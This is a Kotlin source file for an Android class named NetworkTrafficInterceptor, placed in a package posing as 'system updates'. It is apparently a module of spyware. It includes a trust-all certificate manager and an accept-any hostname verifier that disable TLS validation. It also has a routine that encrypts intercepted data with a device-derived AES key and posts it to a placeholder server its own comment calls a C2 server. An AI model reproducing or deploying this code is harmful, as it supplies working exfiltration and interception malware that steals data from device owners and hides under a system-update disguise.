package com.system.updates.modules.network

import android.content.Context
import android.os.Build
import android.util.Base64
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

class NetworkTrafficInterceptor(private val context: Context) {
    private val crypto = CryptoManager(context)
    private val networkUtils = NetworkUtils(context)
    private val tag = "NetworkInterceptor"

    // Intercept HTTPS connection by bypassing certificate validation (optional)
    fun interceptHttps(urlString: String, bypassCert: Boolean = false): String? {
        if (!hasInternetPermission()) {
            Log.e(tag, "Missing INTERNET permission")
            return null
        }
        return try {
            val url = URL(urlString)
            val connection = if (bypassCert) {
                createInsecureHttpsConnection(url)
            } else {
                url.openConnection() as HttpsURLConnection
            }
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.requestMethod = "GET"
            connection.setRequestProperty("User-Agent", "Mozilla/5.0")
            val responseCode = connection.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                reader.forEachLine { response.append(it) }
                reader.close()
                connection.disconnect()
                response.toString()
            } else {
                Log.w(tag, "HTTP error: $responseCode")
                null
            }
        } catch (e: Exception) {
            Log.e(tag, "Interception failed: ${e.message}")
            null
        }
    }

    // Intercept and forward data to C2 server (encrypted)
    fun interceptAndForward(urlString: String, bypassCert: Boolean = false): Boolean {
        val data = interceptHttps(urlString, bypassCert) ?: return false
        val key = crypto.deriveDeviceKey()
        val iv = ByteArray(12).also { SecureRandom().nextBytes(it) }
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, javax.crypto.spec.SecretKeySpec(key, "AES"), javax.crypto.spec.GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(data.toByteArray())
        val full = iv + encrypted
        val b64 = Base64.encodeToString(full, Base64.NO_WRAP)
        val response = networkUtils.httpPost("https://your-server.com/intercept", "data=$b64")
        return response.startsWith("OK")
    }

    // Create an HTTPS connection that trusts all certificates (for debugging/interception)
    private fun createInsecureHttpsConnection(url: URL): HttpsURLConnection {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val sslContext = SSLContext.getInstance("TLS")
        sslContext.init(null, trustAllCerts, SecureRandom())
        val hostnameVerifier = HostnameVerifier { _, _ -> true }
        val conn = url.openConnection() as HttpsURLConnection
        conn.sslSocketFactory = sslContext.socketFactory
        conn.hostnameVerifier = hostnameVerifier
        return conn
    }

    // Check for INTERNET permission (handles Android 6+ runtime permissions)
    private fun hasInternetPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            context.checkSelfPermission(android.Manifest.permission.INTERNET) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            true // Permission granted at install time
        }
    }
}